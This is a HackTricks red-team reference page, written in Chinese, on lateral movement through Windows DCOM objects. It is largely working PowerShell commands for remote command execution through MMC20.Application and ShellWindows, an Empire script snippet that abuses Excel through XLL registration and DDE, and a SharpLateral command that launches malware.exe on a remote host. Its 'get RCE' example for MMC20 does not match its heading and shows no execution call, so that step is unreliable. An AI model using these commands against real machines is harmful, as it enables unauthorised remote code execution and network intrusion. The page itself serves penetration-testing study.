# DCOM Exec

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

* 您在**网络安全公司**工作吗？ 想要看到您的**公司在HackTricks中做广告**？ 或者想要访问**PEASS的最新版本或下载HackTricks的PDF**？ 请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFT收藏品](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到最重要的漏洞，以便更快修复。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## MMC20.Application

**有关此技术的更多信息，请查看原始帖子[https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

分布式组件对象模型（DCOM）对象提供了与对象进行基于网络的交互的有趣能力。Microsoft为DCOM和组件对象模型（COM）提供了全面的文档，可在[此处查看DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx)和[此处查看COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx)。可以使用PowerShell命令检索DCOM应用程序的列表：
```bash
Get-CimInstance Win32_DCOMApplication
```
COM对象，[MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)，可以用于脚本化MMC插件操作。特别地，该对象在`Document.ActiveView`下包含一个`ExecuteShellCommand`方法。有关此方法的更多信息可以在[这里](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx)找到。运行以下命令进行检查：

此功能通过DCOM应用程序促进了通过网络执行命令。要作为管理员远程与DCOM交互，可以使用PowerShell进行如下操作：
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
这个命令连接到DCOM应用程序并返回COM对象的一个实例。然后可以调用ExecuteShellCommand方法在远程主机上执行一个进程。该进程涉及以下步骤：

检查方法：
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
获取远程代码执行（RCE）：
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**有关此技术的更多信息，请查阅原始文章[https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

**MMC20.Application** 对象被发现缺乏显式的“LaunchPermissions”，默认权限允许管理员访问。有关更多详细信息，请查看[此处](https://twitter.com/tiraniddo/status/817532039771525120)，建议使用[@tiraniddo](https://twitter.com/tiraniddo)的 OleView .NET 来过滤没有显式启动权限的对象。

由于缺乏显式启动权限，两个特定对象 `ShellBrowserWindow` 和 `ShellWindows` 受到关注。在 `HKCR:\AppID\{guid}` 下缺少 `LaunchPermission` 注册表项表示没有显式权限。

### ShellWindows
对于 `ShellWindows`，缺乏 ProgID，.NET 方法 `Type.GetTypeFromCLSID` 和 `Activator.CreateInstance` 通过其 AppID 促进对象实例化。此过程利用 OleView .NET 检索 `ShellWindows` 的 CLSID。一旦实例化，可以通过 `WindowsShell.Item` 方法进行交互，从而导致像 `Document.Application.ShellExecute` 这样的方法调用。

提供了示例 PowerShell 命令来实例化对象并远程执行命令：
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### 使用 Excel DCOM 对象进行横向移动

可以通过利用 DCOM Excel 对象实现横向移动。有关详细信息，请阅读关于通过 DCOM 利用 Excel DDE 实现横向移动的讨论，可访问[Cybereason的博客](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)。

Empire 项目提供了一个 PowerShell 脚本，演示了通过操纵 DCOM 对象利用 Excel 进行远程代码执行（RCE）的过程。以下是来自[Empire 的 GitHub 代码库](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)中的脚本片段，展示了滥用 Excel 进行 RCE 的不同方法：
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### 用于横向移动的自动化工具

自动化这些技术的两个工具如下：

- **Invoke-DCOM.ps1**：Empire项目提供的一个PowerShell脚本，简化了在远程计算机上执行代码的不同方法的调用。此脚本可在Empire GitHub存储库中找到。

- **SharpLateral**：一款用于远程执行代码的工具，可使用以下命令：
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## 自动化工具

* Powershell脚本 [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) 允许轻松调用所有已注释的方法来在其他计算机上执行代码。
* 也可以使用 [**SharpLateral**](https://github.com/mertdas/SharpLateral)：
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## 参考

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到最重要的漏洞，这样您就可以更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 今天。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>从零开始学习AWS黑客技术，成为英雄</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
